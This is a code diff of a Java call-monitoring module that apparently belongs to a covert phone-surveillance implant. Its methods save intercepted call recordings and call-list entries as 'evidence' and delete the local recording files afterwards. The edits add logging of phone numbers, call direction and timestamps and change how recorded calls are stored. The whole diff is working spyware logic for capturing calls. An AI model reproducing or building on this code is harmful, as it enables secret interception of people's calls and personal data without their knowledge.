@@ -93,7 +93,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		}
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (notification): number: " + call.getNumber()); //$NON-NLS-1$
+			Check.log(TAG + " (notification): number: " + call.getNumber() + " in:" + call.isIncoming() + " runn:" + isRunning()); //$NON-NLS-1$
 		}
 
 		if (call.isComplete() == false) {
@@ -130,7 +130,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 		}
 
-		if (!call.isOngoing()) {
+		if (!record && !call.isOngoing()) {
 			saveCalllistEvidence(number, incoming, from, to);
 		}
 
@@ -199,9 +199,9 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		return 0;
 	}
 
-	private void saveCallEvidence(String number, boolean incoming, DateTime from, DateTime to, String currentRecordFile) {
+	private boolean saveCallEvidence(String number, boolean incoming, DateTime from, DateTime to, String currentRecordFile) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile);
+			Check.log(TAG + " (saveCallEvidence): " + currentRecordFile + " number: " + number + " from: " + from + " to: " + to + " incoming: " + incoming);
 		}
 
 		final byte[] additionaldata = getCallAdditionalData(number, incoming, from, to);
@@ -238,10 +238,14 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			EvidenceReference.atomic(EvidenceType.CALL, additionaldata, ByteArray.intToByteArray(0xffffffff));
 
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (saveCallEvidence): not deleting file: " + file);
+				Check.log(TAG + " (saveCallEvidence): deleting file: " + file);
 			}
 
 			file.delete();
+			
+			return true;
+		}else{
+			return false;
 		}
 	}
 
@@ -308,7 +312,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 
 	private void saveCalllistEvidence(String number, boolean incoming, DateTime from, DateTime to) {
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveCalllistEvidence): " + number);
+			Check.log(TAG + " (saveCalllistEvidence): " + number + " from: " + from + " to: " + to);
 		}
 		if (Cfg.DEBUG) { Check.asserts(number!=null, " (saveCalllistEvidence) Assert failed"); }
 		final boolean outgoing = !incoming;
